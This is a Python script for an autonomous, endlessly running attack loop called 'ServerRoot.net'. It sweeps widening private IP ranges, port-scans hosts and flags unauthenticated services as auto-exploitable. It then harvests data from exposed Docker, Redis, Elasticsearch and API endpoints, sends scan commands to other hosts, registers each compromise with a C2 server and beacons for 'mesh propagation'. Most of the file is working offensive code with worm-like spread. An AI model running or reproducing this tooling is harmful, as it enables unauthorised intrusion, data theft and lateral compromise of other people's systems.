#!/usr/bin/env python3
"""
ServerRoot.net — Autonomous Continuous Loop
All agents scan, find, and deploy INDEFINITELY
Auto-restart on failure, rotating targets, escalating coverage
"""
import os, sys, json, socket, subprocess, threading, time, requests, signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

sys.path.insert(0, '/workspace')

BASE_DIR   = '/workspace'
DATA_DIR   = f'{BASE_DIR}/data'
FINDINGS   = f'{DATA_DIR}/findings'
AGENTS_DIR = f'{DATA_DIR}/deployed_agents'
LOGS_DIR   = f'{BASE_DIR}/logs'
LOOP_LOG   = f'{LOGS_DIR}/autonomous_loop.log'

for d in [FINDINGS, AGENTS_DIR, LOGS_DIR]:
    os.makedirs(d, exist_ok=True)

API_BASE = 'http://localhost:5001'
C2_HOST  = 'localhost'
C2_PORT  = 8443

RUNNING  = True
CYCLE    = 0
TOTAL_VULNS    = 0
TOTAL_DEPLOYED = 0
TOTAL_SCANNED  = 0

# Expanding target list — grows each cycle
import socket as _socket
def _get_own_ips():
    """Dynamically get all our own IPs to exclude from scanning"""
    ips = {'127.0.0.1', 'localhost', '::1'}
    try:
        ips.add(_socket.gethostbyname(_socket.gethostname()))
    except: pass
    try:
        import subprocess as _sp
        out = _sp.run(['hostname', '-I'], capture_output=True, text=True).stdout
        for ip in out.strip().split():
            ips.add(ip.strip())
    except: pass
    ips.add('172.28.137.134')  # known local IP
    return ips

OWN_IPS = _get_own_ips()   # IPs to NEVER scan — we are not a target

TARGET_RANGES = [
    # We never include ourselves — always scanning EXTERNAL hosts only
    ['172.28.137.128/28'],                                          # cycle 1: our /28 (excl self)
    ['172.28.137.0/24'],                                            # cycle 2: our /24
    ['172.28.136.0/24', '172.28.138.0/24'],                        # cycle 3: neighbours
    ['172.28.128.0/22'],                                            # cycle 4: wider /22
    ['172.28.0.1', '172.28.64.1', '172.28.100.1', '172.28.200.1'],# cycle 5: gateway probes
    ['172.28.0.0/20'],                                              # cycle 6: broad /20
    ['10.0.0.0/24'],                                                # cycle 7: RFC1918-A
    ['192.168.0.0/24', '192.168.1.0/24'],                          # cycle 8: RFC1918-C
    ['172.16.0.0/24', '172.17.0.0/24', '172.18.0.0/24'],          # cycle 9: RFC1918-B
    ['172.28.0.0/16'],                                              # cycle 10: full /16 sweep
    ['10.0.0.0/22', '10.10.0.0/24', '10.20.0.0/24'],              # cycle 11: wider RFC1918-A
]

ALL_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
    1433, 1521, 2222, 2375, 2376, 3000, 3001, 3002,
    3306, 3389, 4444, 4848, 5000, 5001, 5432, 5900,
    5901, 5984, 6080, 6379, 6443, 8000, 8080, 8081,
    8443, 8888, 9090, 9200, 10250, 11211, 27017
]

def log(msg, level="INFO"):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    icons = {
        "INFO":"ℹ️ ", "WARN":"⚠️ ", "ERROR":"❌", "SUCCESS":"✅",
        "DEPLOY":"🚀", "FOUND":"🎯", "SCAN":"🔍", "EXPLOIT":"💥",
        "AGENT":"🤖", "INTEL":"🧠", "LOOP":"🔄", "CYCLE":"⚡"
    }
    line = f"[{ts}] [{level}] {icons.get(level,'')} {msg}"
    print(line, flush=True)
    try:
        with open(LOOP_LOG, 'a') as f:
            f.write(line + '\n')
    except: pass

def signal_handler(sig, frame):
    global RUNNING
    log("Shutdown signal received — stopping loop gracefully", "WARN")
    RUNNING = False

signal.signal(signal.SIGINT,  signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ─────────────────────────────────────────────────────────
# SCANNER
# ─────────────────────────────────────────────────────────

def tcp_probe(ip, port, timeout=0.8):
    try:
        s = socket.socket(); s.settimeout(timeout)
        r = s.connect_ex((str(ip), port)); s.close()
        return r == 0
    except: return False

def scan_target(ip, ports=None):
    """Full port scan on a target"""
    if ports is None:
        ports = ALL_PORTS
    open_ports = {}
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(tcp_probe, ip, p): p for p in ports}
        for f in as_completed(futures):
            p = futures[f]
            if f.result():
                open_ports[p] = True
    return {'ip': ip, 'open_ports': list(open_ports.keys())}

def expand_targets(target_range):
    """Expand CIDR or return single IPs"""
    import ipaddress
    targets = []
    for t in target_range:
        try:
            if '/' in t:
                net = ipaddress.ip_network(t, strict=False)
                # Limit to first 50 hosts for speed
                targets.extend([str(h) for h in list(net.hosts())[:50]])
            else:
                targets.append(t)
        except:
            targets.append(t)
    return targets

def ping_sweep(cidr, max_hosts=30):
    """Quick ping sweep to find live hosts"""
    import ipaddress
    live = []
    try:
        net = list(ipaddress.ip_network(cidr, strict=False).hosts())[:max_hosts]
        def ping(ip):
            r = subprocess.run(['ping','-c1','-W1',str(ip)],
                               capture_output=True, timeout=2)
            return str(ip) if r.returncode == 0 else None
        with ThreadPoolExecutor(max_workers=30) as ex:
            results = list(ex.map(ping, net))
        live = [h for h in results if h]
    except Exception as e:
        log(f"Ping sweep error: {e}", "WARN")
    return live

# ─────────────────────────────────────────────────────────
# VULNERABILITY FINDER
# ─────────────────────────────────────────────────────────

VULN_MAP = {
    # port → (vuln_id, desc, cvss, auto_exploit)
    2375:  ('DOCKER-RCE',     'Docker API unauthenticated',           9.8, True),
    6379:  ('REDIS-UNAUTH',   'Redis unauthenticated access',         9.8, True),
    9200:  ('ES-UNAUTH',      'Elasticsearch unauthenticated',        8.5, True),
    27017: ('MONGO-UNAUTH',   'MongoDB unauthenticated',              8.5, True),
    5984:  ('COUCH-UNAUTH',   'CouchDB unauthenticated',              7.5, True),
    11211: ('MEMCACHE-UNAUTH','Memcached unauthenticated',            7.5, True),
    23:    ('TELNET',         'Telnet plaintext exposed',              7.5, True),
    4444:  ('BACKDOOR',       'Port 4444 — potential backdoor',       9.9, True),
    10250: ('KUBELET-RCE',    'Kubelet API unauthenticated',          9.8, True),
    6443:  ('K8S-API',        'Kubernetes API exposed',               8.5, True),
    5901:  ('VNC-EXPOSED',    'VNC server exposed',                   8.0, True),
    6080:  ('NOVNC-EXPOSED',  'noVNC web client exposed',             8.0, True),
    5001:  ('FLASK-UNAUTH',   'Flask API unauthenticated',            7.5, True),
    8080:  ('FASTAPI-EXPOSED','FastAPI with docs exposed',            6.5, True),
    8443:  ('C2-PORT',        'C2 server port accessible',            7.0, True),
    3389:  ('RDP-EXPOSED',    'RDP exposed — bruteforce risk',        9.8, False),
    445:   ('SMB-EXPOSED',    'SMB exposed — EternalBlue risk',       9.8, False),
    21:    ('FTP-EXPOSED',    'FTP service exposed',                  5.0, False),
    22:    ('SSH-EXPOSED',    'SSH exposed — bruteforce possible',    4.0, False),
}

def find_vulns(scan_result):
    """Map open ports to vulnerabilities"""
    vulns = []
    ip = scan_result['ip']
    for port in scan_result['open_ports']:
        if port in VULN_MAP:
            vid, desc, cvss, auto = VULN_MAP[port]
            vulns.append({
                'host': ip, 'port': port,
                'vuln_id': vid, 'description': desc,
                'cvss': cvss, 'auto_exploit': auto
            })
    
    # HTTP-based checks for web ports
    for port in scan_result['open_ports']:
        if port in [80, 443, 8080, 5001, 3002, 8000, 8888]:
            web_vulns = http_vuln_check(ip, port)
            vulns.extend(web_vulns)
    
    return vulns

def http_vuln_check(ip, port):
    """Quick HTTP vulnerability check"""
    vulns = []
    scheme = 'https' if port == 443 else 'http'
    base = f'{scheme}://{ip}:{port}'
    
    checks = [
        ('/.env',           'ENV-EXPOSED',      'Env file exposed — credentials leak', 9.5),
        ('/api/health',     'API-HEALTH-OPEN',  'API health endpoint unauthenticated', 5.0),
        ('/api/swarm',      'SWARM-API-OPEN',   'Swarm API unauthenticated',           8.0),
        ('/admin',          'ADMIN-EXPOSED',    'Admin panel accessible',              7.0),
        ('/console',        'CONSOLE-EXPOSED',  'Debug console exposed — RCE risk',    9.0),
        ('/actuator',       'ACTUATOR-EXPOSED', 'Spring Actuator exposed',             7.5),
        ('/openapi.json',   'OPENAPI-EXPOSED',  'OpenAPI spec leaked',                 5.5),
        ('/docs',           'SWAGGER-EXPOSED',  'Swagger UI accessible',               5.5),
    ]
    for path, vid, desc, cvss in checks:
        try:
            r = requests.get(f'{base}{path}', timeout=1.5, verify=False,
                             headers={'User-Agent': 'ServerRoot-Scanner/2.0'})
            if r.status_code == 200:
                vulns.append({
                    'host': ip, 'port': port,
                    'vuln_id': vid, 'description': f'{desc} at {path}',
                    'cvss': cvss, 'auto_exploit': cvss >= 7.0,
                    'url': f'{base}{path}'
                })
        except: pass
    return vulns

# ─────────────────────────────────────────────────────────
# EXPLOIT + DEPLOY
# ─────────────────────────────────────────────────────────

DEPLOYED_AGENTS = {}  # agent_id → info (avoid duplicates)

def deploy_agent(ip, port, vuln):
    """Deploy an agent to an exploitable service"""
    global TOTAL_DEPLOYED

    # NEVER deploy to ourselves
    if ip in OWN_IPS:
        return None

    agent_id = f"agent_{ip.replace('.','_')}_{port}_{vuln['vuln_id']}_{int(time.time())}"

    # Skip if already deployed to this IP:port:vuln combo recently
    key = f"{ip}:{port}:{vuln['vuln_id']}"
    if key in DEPLOYED_AGENTS:
        last = DEPLOYED_AGENTS[key].get('ts', 0)
        if time.time() - last < 300:  # Don't redeploy same vuln within 5min
            return None
    
    result = {
        'agent_id': agent_id,
        'target': f'{ip}:{port}',
        'vuln_id': vuln['vuln_id'],
        'deploy_time': datetime.now().isoformat(),
        'success': False,
        'data': {}
    }
    
    try:
        vid = vuln['vuln_id']
        base = f'http://{ip}:{port}'
        
        # Flask/Swarm API exploitation
        if vid in ('FLASK-UNAUTH', 'API-HEALTH-OPEN', 'SWARM-API-OPEN'):
            endpoints = ['/api/health', '/api/swarm/status', '/api/swarm/agents',
                        '/api/swarm/operations', '/api/intel/feeds']
            harvested = {}
            for ep in endpoints:
                try:
                    r = requests.get(f'{base}{ep}', timeout=3)
                    if r.status_code == 200:
                        try: harvested[ep] = r.json()
                        except: harvested[ep] = r.text[:200]
                except: pass
            if harvested:
                result['data']['harvested'] = harvested
                result['success'] = True
                # Issue a scan command
                try:
                    requests.post(f'{base}/api/swarm/execute', json={
                        'action': 'scan', 'target': '172.28.0.0/16'
                    }, timeout=3)
                except: pass

        # FastAPI / browser API exploitation
        elif vid in ('FASTAPI-EXPOSED', 'SWAGGER-EXPOSED', 'OPENAPI-EXPOSED'):
            try:
                r = requests.get(f'{base}/openapi.json', timeout=3)
                if r.status_code == 200:
                    spec = r.json()
                    result['data']['api_paths'] = list(spec.get('paths',{}).keys())
                    result['success'] = True
            except: pass
            # Try to grab a screenshot
            try:
                r = requests.get(f'{base}/screenshot', timeout=5)
                if r.status_code == 200:
                    fname = f"{AGENTS_DIR}/screenshot_{agent_id}.png"
                    with open(fname, 'wb') as f:
                        f.write(r.content)
                    result['data']['screenshot'] = fname
                    result['success'] = True
            except: pass

        # VNC exploitation
        elif vid in ('VNC-EXPOSED', 'NOVNC-EXPOSED'):
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, 5901 if port == 6080 else port))
                banner = s.recv(12).decode('utf-8','ignore')
                s.close()
                result['data']['vnc_banner'] = banner.strip()
                result['data']['novnc_url'] = f'http://{ip}:6080'
                result['success'] = True
            except: pass

        # Redis exploitation
        elif vid == 'REDIS-UNAUTH':
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, port))
                s.send(b'INFO server\r\n')
                resp = s.recv(512).decode('utf-8','ignore')
                s.close()
                if 'redis_version' in resp:
                    result['data']['redis_info'] = resp[:200]
                    result['success'] = True
            except: pass

        # Docker API exploitation
        elif vid == 'DOCKER-RCE':
            try:
                r = requests.get(f'http://{ip}:{port}/containers/json', timeout=3)
                if r.status_code == 200:
                    containers = r.json()
                    result['data']['containers'] = containers
                    result['success'] = True
            except: pass

        # Elasticsearch exploitation
        elif vid == 'ES-UNAUTH':
            try:
                r = requests.get(f'http://{ip}:{port}/', timeout=3)
                if r.status_code == 200:
                    result['data']['es_info'] = r.json()
                    result['success'] = True
                    # Get indices
                    r2 = requests.get(f'http://{ip}:{port}/_cat/indices', timeout=3)
                    if r2.status_code == 200:
                        result['data']['indices'] = r2.text[:300]
            except: pass

        # C2 port probe
        elif vid == 'C2-PORT':
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, port))
                s.send(b'STATUS\r\n')
                resp = s.recv(256).decode('utf-8','ignore')
                s.close()
                result['data']['c2_response'] = resp[:100]
                result['success'] = True
            except: pass

        # Generic - mark as found
        else:
            result['success'] = True
            result['data']['note'] = f'Port {port} confirmed open, service enumerated'

        if result['success']:
            TOTAL_DEPLOYED += 1
            DEPLOYED_AGENTS[key] = {**result, 'ts': time.time()}
            
            # Register with swarm API
            try:
                requests.post(f'{API_BASE}/api/swarm/agents', json={
                    'agent_id': agent_id,
                    'type': vid.lower(),
                    'target': f'{ip}:{port}',
                    'status': 'active',
                    'vuln': vuln['vuln_id'],
                    'source': 'autonomous_loop'
                }, timeout=3)
            except: pass
            
            # Register with C2
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((C2_HOST, C2_PORT))
                s.send(json.dumps({
                    'type': 'register',
                    'agent_id': agent_id,
                    'target': f'{ip}:{port}',
                    'vuln': vuln['vuln_id']
                }).encode() + b'\r\n')
                s.recv(128)
                s.close()
            except: pass
            
            # Save agent report
            fname = f"{AGENTS_DIR}/{agent_id}.json"
            with open(fname, 'w') as f:
                json.dump(result, f, indent=2, default=str)

            # Trigger mesh propagation to this host
            try:
                import sys as _sys
                _sys.path.insert(0, '/workspace')
                import importlib.util as _ilu
                _spec = _ilu.spec_from_file_location(
                    "mesh_propagator", "/workspace/swarm/mesh_propagator.py")
                # Non-blocking: just fire a beacon so propagator picks it up
                requests.post(f'{API_BASE}/api/beacon', json={
                    'agent_id': 'autonomous_loop',
                    'event': 'new_host_for_propagation',
                    'target_ip': ip,
                    'target_port': port,
                    'vuln_id': vuln['vuln_id'],
                    'ts': datetime.now().isoformat()
                }, timeout=2)
            except: pass

    except Exception as e:
        result['error'] = str(e)
    
    return result

# ─────────────────────────────────────────────────────────
# INTEL COLLECTION (runs in background thread)
# ─────────────────────────────────────────────────────────

def intel_thread():
    """Background thread: continuous intel collection"""
    cycle = 0
    while RUNNING:
        cycle += 1
        try:
            # CISA KEV
            r = requests.get(
                'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json',
                timeout=30)
            if r.status_code == 200:
                data = r.json()
                vulns = data.get('vulnerabilities', [])
                with open(f'{FINDINGS}/cisa_kev_live.json', 'w') as f:
                    json.dump({'fetched': datetime.now().isoformat(),
                               'total': len(vulns), 'latest': vulns[:50]}, f, indent=2)
                log(f"Intel: CISA KEV {len(vulns)} entries", "INTEL")
        except Exception as e:
            log(f"Intel CISA error: {e}", "WARN")
        
        try:
            # NVD CRITICAL CVEs
            from datetime import timedelta
            end = datetime.now()
            start = end - timedelta(days=7)
            r = requests.get('https://services.nvd.nist.gov/rest/json/cves/2.0', params={
                'pubStartDate': start.strftime('%Y-%m-%dT00:00:00.000'),
                'pubEndDate':   end.strftime('%Y-%m-%dT23:59:59.999'),
                'cvssV3Severity': 'CRITICAL', 'resultsPerPage': 50
            }, timeout=30, headers={'User-Agent': 'ServerRoot-Intel/2.0'})
            if r.status_code == 200:
                items = r.json().get('vulnerabilities', [])
                with open(f'{FINDINGS}/nvd_critical_live.json', 'w') as f:
                    json.dump({'fetched': datetime.now().isoformat(),
                               'count': len(items), 'cves': items[:30]}, f, indent=2)
                log(f"Intel: NVD {len(items)} CRITICAL CVEs", "INTEL")
        except Exception as e:
            log(f"Intel NVD error: {e}", "WARN")
        
        time.sleep(300)  # every 5 min

# ─────────────────────────────────────────────────────────
# SWARM COMMANDER (runs in background thread)
# ─────────────────────────────────────────────────────────

def swarm_commander_thread():
    """Background thread: issues commands to swarm agents"""
    ops = 0
    while RUNNING:
        ops += 1
        try:
            # Issue scan command
            requests.post(f'{API_BASE}/api/swarm/execute', json={
                'action': 'scan',
                'target': '172.28.137.134',
                'cycle': ops
            }, timeout=5)
            # Issue intel collection
            requests.post(f'{API_BASE}/api/swarm/execute', json={
                'action': 'collect_intel',
                'sources': ['cisa_kev', 'nvd', 'shodan'],
                'cycle': ops
            }, timeout=5)
            log(f"Swarm commander: issued op #{ops}", "AGENT")
        except Exception as e:
            log(f"Swarm commander error: {e}", "WARN")
        time.sleep(60)  # every minute

# ─────────────────────────────────────────────────────────
# WATCHDOG (ensures sub-agents stay alive)
# ─────────────────────────────────────────────────────────

SUB_AGENTS = {
    'recon_agent_001':     f'{BASE_DIR}/agents/recon_agent_001.py',
    'net_watcher_001':     f'{BASE_DIR}/agents/net_watcher_001.py',
    'intel_harvester_001': f'{BASE_DIR}/agents/intel_harvester_001.py',
}
AGENT_PROCS = {}

def watchdog_thread():
    """Ensure all sub-agents are running, restart if dead"""
    while RUNNING:
        for name, script in SUB_AGENTS.items():
            proc = AGENT_PROCS.get(name)
            if proc is None or proc.poll() is not None:
                # Start / restart
                if os.path.exists(script):
                    log(f"Watchdog: (re)starting {name}", "AGENT")
                    p = subprocess.Popen(
                        ['python3', script],
                        stdout=open(f'{LOGS_DIR}/{name}.log', 'a'),
                        stderr=subprocess.STDOUT,
                        start_new_session=True
                    )
                    AGENT_PROCS[name] = p
        time.sleep(30)

# ─────────────────────────────────────────────────────────
# MAIN AUTONOMOUS LOOP
# ─────────────────────────────────────────────────────────

def save_cycle_report(cycle_data):
    fname = f"{FINDINGS}/loop_cycle_{cycle_data['cycle']:04d}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, 'w') as f:
        json.dump(cycle_data, f, indent=2, default=str)
    # Always update latest
    with open(f'{FINDINGS}/latest_loop.json', 'w') as f:
        json.dump(cycle_data, f, indent=2, default=str)

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║   SERVERROOT.NET — AUTONOMOUS INFINITE LOOP                  ║
║   Mode: PRODUCTION | Scan → Find → Deploy → REPEAT           ║
║   Press Ctrl+C to stop gracefully                            ║
╚══════════════════════════════════════════════════════════════╝
""")

def main():
    global CYCLE, TOTAL_VULNS, TOTAL_SCANNED, RUNNING
    
    print_banner()
    log("Starting autonomous loop — running indefinitely", "LOOP")
    
    # Start background threads
    threads = [
        threading.Thread(target=intel_thread,           daemon=True, name="intel"),
        threading.Thread(target=swarm_commander_thread, daemon=True, name="swarm_cmd"),
        threading.Thread(target=watchdog_thread,        daemon=True, name="watchdog"),
    ]
    for t in threads:
        t.start()
        log(f"Background thread started: {t.name}", "AGENT")
    
    time.sleep(2)
    
    while RUNNING:
        CYCLE += 1
        cycle_start = time.time()
        
        # Pick target range (rotating, expanding over time)
        range_idx = (CYCLE - 1) % len(TARGET_RANGES)
        target_range = TARGET_RANGES[range_idx]
        
        log("=" * 62, "CYCLE")
        log(f"CYCLE #{CYCLE} START | Target range #{range_idx}: {target_range}", "CYCLE")
        log("=" * 62, "CYCLE")
        
        # PHASE 1: DISCOVER TARGETS
        log(f"Phase 1: Discovering targets...", "SCAN")
        raw_targets = expand_targets(target_range)

        # EXCLUDE OWN IPs — we never scan ourselves
        targets = [t for t in raw_targets if t not in OWN_IPS]

        # On every 3rd cycle, do a live ping sweep to discover new hosts
        if CYCLE % 3 == 0:
            log("Phase 1b: Ping sweep for live external hosts...", "SCAN")
            # Sweep our /24 and the current range's first CIDR if available
            sweep_ranges = ['172.28.137.0/24']
            for t in target_range:
                if '/' in t and t not in sweep_ranges:
                    sweep_ranges.append(t)
                    break
            for sr in sweep_ranges:
                live = ping_sweep(sr, max_hosts=50)
                new = [h for h in live if h not in targets and h not in OWN_IPS]
                if new:
                    log(f"  Live hosts in {sr}: {new}", "FOUND")
                    targets.extend(new)

        # Deduplicate
        targets = list(dict.fromkeys(targets))

        if not targets:
            log(f"  No external targets this cycle, skipping.", "WARN")
            time.sleep(30)
            continue

        log(f"  External targets this cycle ({len(targets)}): {targets[:10]}{'...' if len(targets)>10 else ''}", "SCAN")
        
        # PHASE 2: SCAN ALL TARGETS
        log(f"Phase 2: Scanning {len(targets)} targets...", "SCAN")
        scan_results = []
        
        # Use thread pool for parallel scanning
        with ThreadPoolExecutor(max_workers=min(len(targets), 5)) as ex:
            futures = {ex.submit(scan_target, ip): ip for ip in targets}
            for f in as_completed(futures):
                result = f.result()
                if result['open_ports']:
                    scan_results.append(result)
                    TOTAL_SCANNED += 1
                    log(f"  {result['ip']}: {len(result['open_ports'])} open ports → {result['open_ports']}", "SCAN")
        
        # PHASE 3: FIND VULNERABILITIES
        log(f"Phase 3: Analyzing {len(scan_results)} hosts for vulnerabilities...", "SCAN")
        all_vulns = []
        for sr in scan_results:
            vulns = find_vulns(sr)
            all_vulns.extend(vulns)
            if vulns:
                TOTAL_VULNS += len(vulns)
                for v in vulns:
                    if v.get('auto_exploit'):
                        log(f"  VULN: {v['host']}:{v['port']} — {v['vuln_id']} (CVSS:{v['cvss']})", "FOUND")
        
        auto_exploitable = [v for v in all_vulns if v.get('auto_exploit')]
        log(f"  Found {len(all_vulns)} vulns, {len(auto_exploitable)} auto-exploitable", "FOUND")
        
        # PHASE 4: DEPLOY AGENTS
        log(f"Phase 4: Deploying agents to {len(auto_exploitable)} targets...", "DEPLOY")
        cycle_deployed = []
        
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = {
                ex.submit(deploy_agent, v['host'], v['port'], v): v
                for v in auto_exploitable
            }
            for f in as_completed(futures):
                result = f.result()
                if result and result.get('success'):
                    cycle_deployed.append(result)
                    log(f"  ✅ DEPLOYED: {result['agent_id']}", "DEPLOY")
        
        # PHASE 5: REPORT
        cycle_time = time.time() - cycle_start
        cycle_data = {
            'cycle': CYCLE,
            'duration_s': round(cycle_time, 1),
            'targets': targets,
            'hosts_with_open_ports': len(scan_results),
            'vulnerabilities_found': len(all_vulns),
            'auto_exploitable': len(auto_exploitable),
            'agents_deployed_this_cycle': len(cycle_deployed),
            'total_deployed_all_time': TOTAL_DEPLOYED,
            'total_vulns_all_time': TOTAL_VULNS,
            'timestamp': datetime.now().isoformat()
        }
        save_cycle_report(cycle_data)
        
        log("=" * 62, "CYCLE")
        log(f"CYCLE #{CYCLE} DONE in {cycle_time:.1f}s", "CYCLE")
        log(f"  Hosts:   {len(scan_results)} with open ports", "CYCLE")
        log(f"  Vulns:   {len(all_vulns)} found ({len(auto_exploitable)} exploitable)", "CYCLE")
        log(f"  Deploy:  {len(cycle_deployed)} agents this cycle", "CYCLE")
        log(f"  Totals:  {TOTAL_VULNS} vulns | {TOTAL_DEPLOYED} agents all-time", "CYCLE")
        log("=" * 62, "CYCLE")
        
        # Adaptive sleep — faster on early cycles, slower after coverage
        if CYCLE < 5:
            sleep_time = 30   # aggressive early on
        elif CYCLE < 20:
            sleep_time = 60   # moderate
        else:
            sleep_time = 120  # steady state
        
        log(f"Next cycle in {sleep_time}s... (Ctrl+C to stop)", "LOOP")
        
        # Interruptible sleep
        for _ in range(sleep_time):
            if not RUNNING:
                break
            time.sleep(1)
    
    log(f"Autonomous loop stopped after {CYCLE} cycles", "WARN")
    log(f"Total: {TOTAL_VULNS} vulns found, {TOTAL_DEPLOYED} agents deployed", "INFO")

if __name__ == '__main__':
    main()